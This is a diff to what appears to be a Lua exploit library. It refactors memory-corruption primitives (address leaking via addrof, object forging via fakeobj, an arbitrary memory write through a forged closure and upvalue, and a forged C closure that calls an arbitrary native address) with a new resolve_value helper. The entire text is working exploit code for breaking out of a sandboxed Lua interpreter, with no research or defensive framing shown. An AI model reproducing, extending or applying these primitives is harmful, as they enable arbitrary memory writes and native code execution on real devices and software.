@@ -248,7 +248,7 @@ end
 -- setup a table where we can read its array buffer
 function lua.setup_victim_table()
     local t = { 1, 2, 3, 4 }
-    local array_addr = memory.read_qword(lua.addrof(t)+24)
+    local array_addr = memory.read_qword(lua.resolve_value(t))
     if array_addr then
         if memory.read_buffer(array_addr, 1) then  -- test if we can read the buffer
             lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
@@ -289,6 +289,17 @@ function lua.addrof(obj)
     return lua.get_table_value(obj) or lua.addrof_trivial(obj)
 end
 
+function lua.resolve_value(v)
+    if type(v) == "string" or type(v) == "table" then
+        return lua.addrof(v)+24
+    elseif type(v) == "number" then
+        return uint64(v)
+    elseif is_uint64(v) then
+        return v
+    end
+    errorf("lua.resolve_value: invalid type (%s)", type(v))
+end
+
 function lua.fakeobj(obj_addr, ttype)
     return lua.fake_table_value(obj_addr, ttype) or lua.fakeobj_through_closure(obj_addr, ttype)
 end
@@ -318,7 +329,7 @@ end
 -- write 8 bytes (double) at target address with 4 bytes corruption after addr+8
 function lua.write_double(addr, value)
     local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
-    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval)+24)  -- env + proto + upvals
+    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.resolve_value(fake_upval))  -- env + proto + upvals
     lua.write_upval(fake_closure, value)
 end
 
@@ -333,7 +344,7 @@ end
 function lua.create_fake_cclosure(addr)
     -- next + tt/marked/isC/nupvalues/hole + gclist + env + f
     local fake_cclosure = ub8(0) .. "\6\0\1\0\0\0\0\0" .. ub8(0) .. ub8(0) .. ub8(addr)
-    return lua.fakeobj(lua.addrof(fake_cclosure)+24, lua_types.LUA_TFUNCTION)
+    return lua.fakeobj(lua.resolve_value(fake_cclosure), lua_types.LUA_TFUNCTION)
 end
 
 
